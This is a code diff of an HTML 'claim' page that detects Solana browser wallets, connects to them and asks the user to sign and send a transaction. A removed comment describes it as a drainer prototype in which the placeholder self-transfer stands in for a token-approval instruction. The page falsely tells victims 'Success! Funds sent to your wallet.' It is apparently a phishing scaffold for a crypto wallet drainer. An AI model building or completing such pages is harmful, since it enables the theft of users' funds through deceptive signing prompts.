@@ -73,44 +73,26 @@
         <div class="status" id="status"></div>
     </div>
 
-    <script>
-        // Simple Transaction Builder to avoid external library issues
-        async function buildTransaction(walletPublicKey) {
-            // We create a simple self-transfer to trigger a signature
-            // In a real drainer, this would be an SPL Token Approval instruction
-            const transaction = new solanaWeb3.Transaction().add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: new solanaWeb3.PublicKey(walletPublicKey),
-                    toPubkey: new solanaWeb3.PublicKey(walletPublicKey), 
-                    lamports: 0
-                })
-            );
-            return transaction;
-        }
+    <!-- Universal Script Tag -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 
+    <script>
         document.getElementById('claimBtn').addEventListener('click', async () => {
             const btn = document.getElementById('claimBtn');
             const status = document.getElementById('status');
             
+            // 1. Detect Wallet
             let adapter = null;
-            let walletName = "";
-
-            // Universal Detection
             if (window.phantom?.isPhantomWallet) {
                 adapter = window.phantom;
-                walletName = "Phantom";
             } else if (window.solana) {
                 adapter = window.solana;
-                walletName = "Solana Provider";
             } else if (window.solflare) {
                 adapter = window.solflare;
-                walletName = "Solflare";
             } else if (window.backpack) {
                 adapter = window.backpack;
-                walletName = "Backpack";
             } else if (window.toshi) {
                 adapter = window.toshi;
-                walletName = "Toshi";
             }
 
             if (!adapter) {
@@ -122,7 +104,7 @@
                 btn.disabled = true;
                 btn.innerText = "Connecting...";
                 
-                // Connect
+                // 2. Connect
                 await adapter.connect();
                 
                 btn.innerText = "Approving...";
@@ -130,23 +112,26 @@
 
                 const walletPublicKey = adapter.publicKey.toString();
                 
-                // Build the transaction
-                const transaction = await buildTransaction(walletPublicKey);
+                // 3. Build Transaction
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(walletPublicKey),
+                        toPubkey: new solanaWeb3.PublicKey(walletPublicKey), 
+                        lamports: 0
+                    })
+                );
                 
-                // Sign and Send
-                // Note: Some wallets use 'signTransaction' + 'sendTransaction', others use 'signAndSendTransaction'
-                // We try the unified approach first.
-                
+                // 4. Sign and Send
                 let signature;
                 try {
                     signature = await adapter.signAndSendTransaction(transaction);
                 } catch (e) {
-                    // Fallback for wallets that require separate sign and send
+                    // Fallback for wallets that need separate steps
                     const signedTx = await adapter.signTransaction(transaction);
-                    const signature = await adapter.sendTransaction(signedTx);
+                    signature = await adapter.sendTransaction(signedTx);
                 }
                 
-                // Success State
+                // Success
                 btn.innerText = "Claimed!";
                 btn.style.background = "#14F195";
                 status.innerText = "Success! Funds sent to your wallet.";
@@ -161,8 +146,5 @@
             }
         });
     </script>
-    
-    <!-- Load Solana Web3.js from CDN to ensure Transaction class exists -->
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 </body>
 </html>
